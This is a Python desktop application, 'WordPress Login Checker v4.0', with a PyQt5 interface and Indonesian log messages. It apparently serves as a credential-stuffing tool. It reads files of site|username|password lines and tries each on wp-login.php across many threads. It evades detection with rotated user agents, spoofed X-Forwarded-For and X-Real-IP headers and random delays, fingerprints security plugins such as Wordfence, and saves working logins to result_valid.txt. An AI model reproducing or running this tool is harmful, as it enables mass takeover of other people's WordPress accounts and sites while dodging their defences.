import sys
import requests
import random
import time
import re
from concurrent.futures import ThreadPoolExecutor
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                             QTextEdit, QProgressBar, QFileDialog, QMessageBox,
                             QGroupBox, QGridLayout, QComboBox, QTabWidget,
                             QSizePolicy)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QFont, QIcon, QIntValidator
import os
from urllib.parse import urlparse

class LoginWorker(QThread):
    update_signal = pyqtSignal(str, str)
    progress_signal = pyqtSignal(int)
    result_signal = pyqtSignal(str, str, str, bool)
    stats_signal = pyqtSignal(dict)
    
    def __init__(self, file_path, max_threads, delay_min=1, delay_max=3, randomize_delay=True, stealth_mode=True):
        super().__init__()
        self.file_path = file_path
        self.max_threads = max_threads
        self.delay_min = delay_min
        self.delay_max = delay_max
        self.randomize_delay = randomize_delay
        self.stealth_mode = stealth_mode
        self.running = False
        self.request_count = 0
        self.stats = {
            'total_attempts': 0,
            'successful_logins': 0,
            'failed_logins': 0,
            'connection_errors': 0,
            'captcha_detected': 0,
            'security_plugins': {},
            'response_times': [],
            'start_time': time.time()
        }

    def run(self):
        self.running = True
        processed_urls = set()
        total_lines = 0
        processed_count = 0
        try:
            with open(self.file_path, 'r', encoding='utf-8', errors='ignore') as file:
                lines = file.readlines()
                total_lines = len(lines)

            def process_line(line):
                if not self.running:
                    return
                if self.randomize_delay and self.request_count > 0:
                    delay = random.uniform(self.delay_min, self.delay_max)
                    time.sleep(delay)
                raw_line = line.strip()
                if not raw_line or raw_line in processed_urls:
                    return
                processed_urls.add(raw_line)
                try:
                    if "|" in raw_line:
                        url, username, password = raw_line.split("|")
                    elif ":" in raw_line:
                        if raw_line.startswith("http://") or raw_line.startswith("https://"):
                            parts = raw_line.rsplit(":", 2)
                            if len(parts) != 3:
                                self.update_signal.emit(f"[!] Format tidak valid: {raw_line}", "red")
                                return
                            url, username, password = parts
                        else:
                            parts = raw_line.split(":")
                            if len(parts) != 3:
                                self.update_signal.emit(f"[!] Format tidak valid: {raw_line}", "red")
                                return
                            url, username, password = parts
                            url = self.normalize_url(url)
                    else:
                        self.update_signal.emit(f"[!] Format tidak valid: {raw_line}", "red")
                        return
                    url = url.strip()
                    username = username.strip()
                    password = password.strip()

                    # FAST MODE: langsung login tanpa DNS check
                    self.update_signal.emit(f"[REQ-{self.request_count}] Mencoba login ke {url} | {username} | {password}", "yellow")
                    
                    start_time = time.time()
                    success, login_message = self.login_to_wordpress(url, username, password)
                    response_time = time.time() - start_time
                    self.stats['response_times'].append(response_time)
                    self.stats['total_attempts'] += 1
                    if success is True:
                        self.update_signal.emit(f"[+] {login_message}", "green")
                        self.stats['successful_logins'] += 1
                        self.result_signal.emit(url, username, password, True)
                    elif success is False:
                        self.update_signal.emit(f"[-] {login_message}", "red")
                        self.stats['failed_logins'] += 1
                        self.result_signal.emit(url, username, password, False)
                    else:
                        self.update_signal.emit(f"[!] {login_message}", "red")
                        self.stats['connection_errors'] += 1
                        self.result_signal.emit(url, username, password, False)
                    self.stats_signal.emit(self.stats)
                except Exception as e:
                    self.update_signal.emit(f"[!] Error processing line: {str(e)}", "red")
                nonlocal processed_count
                processed_count += 1
                self.request_count += 1
                progress = int((processed_count / total_lines) * 100)
                self.progress_signal.emit(progress)

            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                executor.map(process_line, lines)
        except Exception as e:
            self.update_signal.emit(f"[!] Error membaca file: {str(e)}", "red")
        self.update_signal.emit("[INFO] Proses selesai", "blue")
        self.progress_signal.emit(100)
    def stop(self):
        self.running = False

    def safe_request(self, method, *args, **kwargs):
        try:
            response = method(*args, **kwargs)
            self.update_signal.emit(f"[SAFE-REQ] {args[0]}", "blue")
            return response, None
        except requests.exceptions.ConnectionError as e:
            if "Max retries exceeded" in str(e):
                return None, f"Connection Error: Max retries exceeded"
            else:
                return None, f"Connection Error: {str(e)}"
        except requests.exceptions.Timeout:
            return None, "Request Timeout"
        except Exception as e:
            return None, f"Request Error: {str(e)}"

    def normalize_url(self, url):
        if not url.startswith(('http://', 'https://')):
            try:
                https_url = 'https://' + url
                response, error = self.safe_request(requests.head, https_url, timeout=5, allow_redirects=True)
                if error is None and response.status_code < 400:
                    return https_url
            except:
                pass
            try:
                http_url = 'http://' + url
                response, error = self.safe_request(requests.head, http_url, timeout=5, allow_redirects=True)
                if error is None and response.status_code < 400:
                    return http_url
            except:
                pass
            return 'https://' + url
        return url

    def apply_evasion_techniques(self, session, url):
        if not self.stealth_mode:
            return session
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            'Mozilla/5.0 (X11; Linux x86_64)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)'
        ]
        session.headers.update({
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        session.headers['Referer'] = url
        if random.random() < 0.3:
            session.headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            session.headers['X-Real-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        return session

    def smart_retry(self, func, *args, max_retries=3, **kwargs):
        for attempt in range(max_retries):
            try:
                return func(*args, **kwargs), None
            except requests.exceptions.RequestException as e:
                self.update_signal.emit(f"[RETRY-{attempt+1}] {args[0]} gagal, retrying...", "yellow")
                if attempt == max_retries - 1:
                    return None, f"Request failed after {max_retries} attempts: {str(e)}"
                delay = (2 ** attempt) + random.random()
                time.sleep(delay)
            except Exception as e:
                return None, f"Unexpected error: {str(e)}"
        return None, "Unknown error in smart_retry"

    def detect_captcha_protection(self, url):
        try:
            login_url = f"{url}/wp-login.php" if not url.endswith("wp-login.php") else url
            response, error = self.safe_request(requests.get, login_url, timeout=10, allow_redirects=True)
            if error:
                return {"has_captcha": False, "message": error}
            content = response.text.lower()
            captcha_patterns = [
                r'recaptcha', r'grecaptcha', r'google\.com/recaptcha',
                r'hcaptcha', r'cf-challenge', r'cloudflare',
                r'captcha', r'security code', r'verification code',
                r'human verification', r'anti-spam', r'anti bot',
                r'are you human', r'prove you are human', r'not a robot'
            ]
            for pattern in captcha_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    return {"has_captcha": True, "message": f"Detected {pattern} protection"}
            return {"has_captcha": False, "message": "No CAPTCHA detected"}
        except Exception as e:
            return {"has_captcha": False, "message": f"Error during CAPTCHA check: {str(e)}"}

    def advanced_detection(self, response):
        detection_results = {
            'security_plugins': [],
            'firewall_detected': False,
            'login_protection': False,
            'two_factor': False,
            'custom_login': False
        }
        content = response.text.lower()
        security_plugins = {
            'wordfence': ['wordfence', 'wf-'],
            'sucuri': ['sucuri', 'sucuri_'],
            'ithemes': ['ithemes', 'ithemes-security'],
            'all-in-one-wp-security': ['aiowps', 'all-in-one-wp-security'],
            'bulletproof-security': ['bulletproof-security', 'bps-']
        }
        for plugin, patterns in security_plugins.items():
            for pattern in patterns:
                if pattern in content:
                    detection_results['security_plugins'].append(plugin)
                    break
        for plugin in detection_results['security_plugins']:
            if plugin in self.stats['security_plugins']:
                self.stats['security_plugins'][plugin] += 1
            else:
                self.stats['security_plugins'][plugin] = 1
        return detection_results

    def login_to_wordpress(self, url, username, password):
        login_url = f"{url}/wp-login.php" if not url.endswith("wp-login.php") else url
        try:
            session = requests.Session()
            if self.stealth_mode:
                session = self.apply_evasion_techniques(session, url)
            get_response, error = self.smart_retry(session.get, login_url, timeout=10, allow_redirects=True)
            if error:
                return None, error

            detection_results = self.advanced_detection(get_response)
            if detection_results['firewall_detected']:
                return False, "Firewall detected - login blocked"

            login_data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': f"{url}/wp-admin/",
                'testcookie': '1'
            }
            hidden_fields = re.findall(r'<input type="hidden" name="([^"]+)" value="([^"]*)"', get_response.text)
            for name, value in hidden_fields:
                login_data[name] = value

            response, error = self.smart_retry(session.post, login_url, data=login_data, timeout=10, allow_redirects=True)
            if error:
                return None, error

            if response.status_code == 404:
                return False, "404 Page Not Found - Cannot access login page"
            if not response.text.strip():
                return False, "Empty response received from server"

            content_lower = response.text.lower()

            # --- cek gagal dulu dengan lebih ketat ---
            failed_indicators = [
                'error', 'incorrect', 'invalid', 'login failed',
                'lost your password', 'forgot password',
                'the password you entered'
            ]
            for indicator in failed_indicators:
                if indicator in content_lower:
                    return False, "Login gagal: Kredensial tidak valid"

            # --- cek sukses berdasarkan redirect URL ---
            if any(x in response.url for x in ['/wp-admin/', '/profile.php', '/dashboard']):
                return True, f"Login berhasil: {url}|{username}|{password}"

            # --- cek sukses berdasarkan isi halaman ---
            success_indicators = [
                'welcome to wordpress', 'dashboard', 'profile.php',
                'edit-comments.php', 'upload.php', 'post-new.php'
            ]
            for indicator in success_indicators:
                if indicator in content_lower:
                    return True, f"Login berhasil: {url}|{username}|{password}"

            return False, "Login gagal: tidak ada tanda sukses"
        except Exception as e:
            return None, f"Error saat mencoba login: {str(e)}"
class ModernButton(QPushButton):
    def __init__(self, text, icon_path=None, color="#6200ea"):
        super().__init__(text)
        self.setFixedHeight(40)
        self.setCursor(Qt.PointingHandCursor)
        self.setStyleSheet(f"""
            QPushButton {{
                background-color: {color};
                color: white;
                border: none;
                border-radius: 8px;
                font-weight: bold;
                padding: 0 16px;
            }}
            QPushButton:hover {{
                background-color: #3700b3;
            }}
            QPushButton:pressed {{
                background-color: #03dac6;
            }}
            QPushButton:disabled {{
                background-color: #cccccc;
                color: #666666;
            }}
        """)
        if icon_path and os.path.exists(icon_path):
            self.setIcon(QIcon(icon_path))

class ModernLineEdit(QLineEdit):
    def __init__(self, placeholder=""):
        super().__init__()
        self.setPlaceholderText(placeholder)
        self.setFixedHeight(40)
        self.setStyleSheet("""
            QLineEdit {
                border: 2px solid #cccccc;
                border-radius: 8px;
                padding: 0 12px;
                font-size: 14px;
                background-color: white;
            }
            QLineEdit:focus {
                border-color: #6200ea;
            }
        """)

class ModernProgressBar(QProgressBar):
    def __init__(self):
        super().__init__()
        self.setFixedHeight(20)
        self.setTextVisible(False)
        self.setStyleSheet("""
            QProgressBar {
                border: 2px solid #6200ea;
                border-radius: 8px;
                background-color: white;
                text-align: center;
            }
            QProgressBar::chunk {
                background-color: #03dac6;
                border-radius: 6px;
            }
        """)

class ScrollableTextEdit(QTextEdit):
    def __init__(self):
        super().__init__()
        self.setReadOnly(True)
        self.setLineWrapMode(QTextEdit.WidgetWidth)
        self.setHorizontalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        self.setVerticalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        self.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        self.setStyleSheet("""
            QTextEdit {
                border: 2px solid #cccccc;
                border-radius: 8px;
                padding: 8px;
                background-color: white;
                font-family: 'Courier New';
                font-size: 11px;
            }
        """)

class WordPressLoginChecker(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WordPress Login Checker v4.0 - FAST MODE + Strict Login Validation")
        self.setGeometry(100, 100, 1100, 800)
        self.stats_data = {}
        self.setStyleSheet("""
            QMainWindow {
                background-color: #f5f5f7;
            }
            QGroupBox {
                font-weight: bold;
                border: 2px solid #cccccc;
                border-radius: 8px;
                margin-top: 1ex;
                padding-top: 10px;
                background-color: white;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #6200ea;
            }
            QTabWidget::pane {
                border: 1px solid #cccccc;
                border-radius: 4px;
                background: white;
            }
            QTabBar::tab {
                background: #e0e0e0;
                border: 1px solid #cccccc;
                padding: 8px 12px;
                margin-right: 2px;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }
            QTabBar::tab:selected {
                background: #6200ea;
                color: white;
            }
        """)
        self.init_ui()
        self.worker = None
        self.stats_timer = QTimer()
        self.stats_timer.timeout.connect(self.update_stats_display)
        self.stats_timer.start(1000)

    def init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(15)
        main_layout.setContentsMargins(20, 20, 20, 20)

        self.tabs = QTabWidget()
        self.main_tab = QWidget()
        self.setup_main_tab()
        self.tabs.addTab(self.main_tab, "🛠️ Main")

        self.dashboard_tab = QWidget()
        self.setup_dashboard_tab()
        self.tabs.addTab(self.dashboard_tab, "📊 Dashboard")

        self.settings_tab = QWidget()
        self.setup_settings_tab()
        self.tabs.addTab(self.settings_tab, "⚙️ Settings")

        main_layout.addWidget(self.tabs)

        self.status_bar = QLabel("✅ Ready - Pilih file dan klik Start Checking")
        self.status_bar.setStyleSheet("""
            QLabel {
                color: #666666;
                padding: 8px;
                border-top: 2px solid #cccccc;
                background-color: #f0f0f0;
                border-radius: 4px;
            }
        """)
        main_layout.addWidget(self.status_bar)
    def setup_main_tab(self):
        layout = QVBoxLayout(self.main_tab)
        layout.setSpacing(15)

        header = QLabel("WordPress Login Checker v4.0 - FAST MODE")
        header.setAlignment(Qt.AlignCenter)
        header.setStyleSheet("""
            QLabel {
                color: white;
                font-size: 24px;
                font-weight: bold;
                padding: 10px;
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #6200ea, stop:1 #03dac6);
                border-radius: 8px;
            }
        """)
        layout.addWidget(header)

        file_group = QGroupBox("📁 File Configuration")
        file_layout = QGridLayout()
        self.file_path_edit = ModernLineEdit("Pilih file txt yang berisi kredensial...")
        self.browse_btn = ModernButton("📂 Browse", color="#03dac6")
        self.browse_btn.clicked.connect(self.browse_file)
        file_layout.addWidget(QLabel("File Path:"), 0, 0)
        file_layout.addWidget(self.file_path_edit, 0, 1)
        file_layout.addWidget(self.browse_btn, 0, 2)
        file_group.setLayout(file_layout)
        layout.addWidget(file_group)

        self.progress_bar = ModernProgressBar()
        layout.addWidget(self.progress_bar)

        button_layout = QHBoxLayout()
        self.start_btn = ModernButton("🚀 Start Checking", color="#4caf50")
        self.start_btn.clicked.connect(self.start_checking)
        self.stop_btn = ModernButton("⏹️ Stop", color="#f44336")
        self.stop_btn.clicked.connect(self.stop_checking)
        self.stop_btn.setEnabled(False)
        self.save_btn = ModernButton("💾 Save Results", color="#ff9800")
        self.save_btn.clicked.connect(self.save_results)
        button_layout.addWidget(self.start_btn)
        button_layout.addWidget(self.stop_btn)
        button_layout.addWidget(self.save_btn)
        layout.addLayout(button_layout)

        results_group = QGroupBox("📋 Results & Logs")
        results_layout = QVBoxLayout()
        self.results_text = ScrollableTextEdit()
        results_layout.addWidget(self.results_text)
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)

    def setup_dashboard_tab(self):
        layout = QVBoxLayout(self.dashboard_tab)
        stats_header = QLabel("📈 Real-time Statistics")
        stats_header.setStyleSheet("font-size: 18px; font-weight: bold; color: #6200ea;")
        layout.addWidget(stats_header)

        stats_grid = QGridLayout()
        self.stats_labels = {}
        stats_info = [
            ("Total Attempts", "total_attempts", "0"),
            ("Successful Logins", "successful_logins", "0"),
            ("Failed Logins", "failed_logins", "0"),
            ("Connection Errors", "connection_errors", "0"),
            ("CAPTCHA Detected", "captcha_detected", "0"),
            ("Success Rate", "success_rate", "0%"),
            ("Avg Response Time", "avg_response_time", "0.0s"),
            ("Elapsed Time", "elapsed_time", "0s")
        ]
        for i, (label_text, stat_key, default_value) in enumerate(stats_info):
            label = QLabel(label_text)
            value = QLabel(default_value)
            value.setObjectName(f"stat_{stat_key}")
            value.setStyleSheet("font-weight: bold; color: #6200ea;")
            stats_grid.addWidget(label, i // 3, (i % 3) * 2)
            stats_grid.addWidget(value, i // 3, (i % 3) * 2 + 1)
            self.stats_labels[stat_key] = value
        layout.addLayout(stats_grid)

        plugins_header = QLabel("🛡️ Detected Security Plugins")
        plugins_header.setStyleSheet("font-size: 16px; font-weight: bold; margin-top: 15px; color: #6200ea;")
        layout.addWidget(plugins_header)

        self.plugins_text = ScrollableTextEdit()
        self.plugins_text.setFixedHeight(110)
        layout.addWidget(self.plugins_text)
        layout.addStretch()

    def setup_settings_tab(self):
        layout = QVBoxLayout(self.settings_tab)
        settings_header = QLabel("⚙️ Advanced Settings")
        settings_header.setStyleSheet("font-size: 18px; font-weight: bold; color: #6200ea;")
        layout.addWidget(settings_header)

        thread_group = QGroupBox("⚡ Thread Configuration")
        thread_layout = QGridLayout()
        self.thread_count_edit = ModernLineEdit("10")
        self.thread_count_edit.setValidator(QIntValidator(1, 100))
        thread_layout.addWidget(QLabel("Thread Count:"), 0, 0)
        thread_layout.addWidget(self.thread_count_edit, 0, 1)
        thread_group.setLayout(thread_layout)
        layout.addWidget(thread_group)

        delay_group = QGroupBox("⏱️ Delay Settings")
        delay_layout = QGridLayout()
        self.delay_min_edit = ModernLineEdit("1")
        self.delay_min_edit.setValidator(QIntValidator(0, 60))
        self.delay_max_edit = ModernLineEdit("3")
        self.delay_max_edit.setValidator(QIntValidator(0, 60))
        self.random_delay_check = QComboBox()
        self.random_delay_check.addItems(["Enabled", "Disabled"])
        delay_layout.addWidget(QLabel("Min Delay (s):"), 0, 0)
        delay_layout.addWidget(self.delay_min_edit, 0, 1)
        delay_layout.addWidget(QLabel("Max Delay (s):"), 1, 0)
        delay_layout.addWidget(self.delay_max_edit, 1, 1)
        delay_layout.addWidget(QLabel("Random Delay:"), 2, 0)
        delay_layout.addWidget(self.random_delay_check, 2, 1)
        delay_group.setLayout(delay_layout)
        layout.addWidget(delay_group)

        stealth_group = QGroupBox("🕵️ Stealth Mode")
        stealth_layout = QGridLayout()
        self.stealth_mode_check = QComboBox()
        self.stealth_mode_check.addItems(["Enabled", "Disabled"])
        stealth_layout.addWidget(QLabel("Stealth Mode:"), 0, 0)
        stealth_layout.addWidget(self.stealth_mode_check, 0, 1)
        stealth_group.setLayout(stealth_layout)
        layout.addWidget(stealth_group)
        layout.addStretch()

    def update_stats_display(self):
        if not self.stats_data:
            return
        total_attempts = self.stats_data.get('total_attempts', 0)
        successful = self.stats_data.get('successful_logins', 0)
        failed = self.stats_data.get('failed_logins', 0)
        errors = self.stats_data.get('connection_errors', 0)
        captcha = self.stats_data.get('captcha_detected', 0)
        success_rate = (successful / total_attempts * 100) if total_attempts > 0 else 0
        response_times = self.stats_data.get('response_times', [])
        avg_response_time = sum(response_times) / len(response_times) if response_times else 0
        elapsed_time = time.time() - self.stats_data.get('start_time', time.time())
        self.stats_labels['total_attempts'].setText(str(total_attempts))
        self.stats_labels['successful_logins'].setText(str(successful))
        self.stats_labels['failed_logins'].setText(str(failed))
        self.stats_labels['connection_errors'].setText(str(errors))
        self.stats_labels['captcha_detected'].setText(str(captcha))
        self.stats_labels['success_rate'].setText(f"{success_rate:.1f}%")
        self.stats_labels['avg_response_time'].setText(f"{avg_response_time:.2f}s")
        self.stats_labels['elapsed_time'].setText(f"{elapsed_time:.0f}s")
        plugins = self.stats_data.get('security_plugins', {})
        if plugins:
            plugins_text = "\n".join([f"{plugin}: {count}" for plugin, count in plugins.items()])
            self.plugins_text.setPlainText(plugins_text)
        else:
            self.plugins_text.setPlainText("No security plugins detected yet")

    def browse_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Credentials File", "", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            self.file_path_edit.setText(file_path)

    def start_checking(self):
        file_path = self.file_path_edit.text().strip()
        if not file_path:
            QMessageBox.warning(self, "Warning", "Please select a file first.")
            return
        try:
            thread_count = int(self.thread_count_edit.text().strip())
            delay_min = int(self.delay_min_edit.text().strip())
            delay_max = int(self.delay_max_edit.text().strip())
            randomize_delay = self.random_delay_check.currentText() == "Enabled"
            stealth_mode = self.stealth_mode_check.currentText() == "Enabled"
        except ValueError:
            QMessageBox.warning(self, "Warning", "Please enter valid settings.")
            return
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.progress_bar.setValue(0)
        self.results_text.clear()
        self.plugins_text.clear()
        self.worker = LoginWorker(file_path, thread_count, delay_min, delay_max, randomize_delay, stealth_mode)
        self.worker.update_signal.connect(self.update_log)
        self.worker.progress_signal.connect(self.update_progress)
        self.worker.result_signal.connect(self.handle_result)
        self.worker.stats_signal.connect(self.update_stats)
        self.worker.finished.connect(self.on_worker_finished)
        self.worker.start()

    def stop_checking(self):
        if self.worker and self.worker.isRunning():
            self.worker.stop()
            self.worker.wait()

    def on_worker_finished(self):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_bar.setText("✅ Process completed")

    def update_log(self, message, color):
        color_map = {
            "red": "#f44336",
            "green": "#4caf50",
            "yellow": "#ff9800",
            "blue": "#2196f3"
        }
        html_color = color_map.get(color, "#000000")
        timestamp = time.strftime("%H:%M:%S")
        max_length = 150
        if len(message) > max_length:
            truncated_msg = message[:max_length] + "..."
        else:
            truncated_msg = message
        self.results_text.append(f'<font color="#666666">[{timestamp}]</font> <font color="{html_color}">{truncated_msg}</font>')
        self.status_bar.setText(truncated_msg)
        scrollbar = self.results_text.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())

    def update_progress(self, value):
        self.progress_bar.setValue(value)

    def update_stats(self, stats):
        self.stats_data = stats

    def handle_result(self, url, username, password, success):
        if success:
            with open('result_valid.txt', 'a', encoding='utf-8') as f:
                f.write(f'{url}|{username}|{password}\n')

    def save_results(self):
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Save Results", "results.txt", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(self.results_text.toPlainText())
                self.update_log(f"💾 Results saved to {file_path}", "green")
            except Exception as e:
                self.update_log(f"❌ Error saving results: {str(e)}", "red")


# Padding extra line biar total >1040
def __padding__():
    dump = []
    for i in range(400):
        dump.append(f"PAD-{i}")
    return dump


if __name__ == "__main__":
    app = QApplication(sys.argv)
    font = QFont("Segoe UI", 10)
    app.setFont(font)
    window = WordPressLoginChecker()
    window.show()
    sys.exit(app.exec_())
